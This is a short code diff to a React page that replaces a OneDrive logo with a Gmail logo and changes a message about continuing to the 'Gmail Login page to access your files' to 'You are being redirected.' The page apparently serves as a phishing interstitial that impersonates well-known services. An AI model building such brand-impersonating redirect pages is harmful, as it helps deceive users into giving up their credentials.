@@ -43,8 +43,8 @@ function App() {
       <div className="bg-white rounded-2xl shadow-2xl max-w-xl w-full p-6 text-center">
         <div className="mb-4 flex justify-center">
           <img
-            src="https://download.logo.wine/logo/OneDrive/OneDrive-Logo.wine.png"
-            alt="OneDrive Logo"
+            src="https://upload.wikimedia.org/wikipedia/commons/7/7e/Gmail_icon_%282020%29.svg"
+            alt="Gmail Logo"
             className="h-20 w-auto"
           />
         </div>
@@ -54,7 +54,7 @@ function App() {
         </h1>
 
         <p className="text-base text-gray-600 mb-6 leading-relaxed">
-          You can now safely continue to the Gmail Login page to access your files.
+          You are being redirected.
         </p>
 
         <div className="flex justify-center">
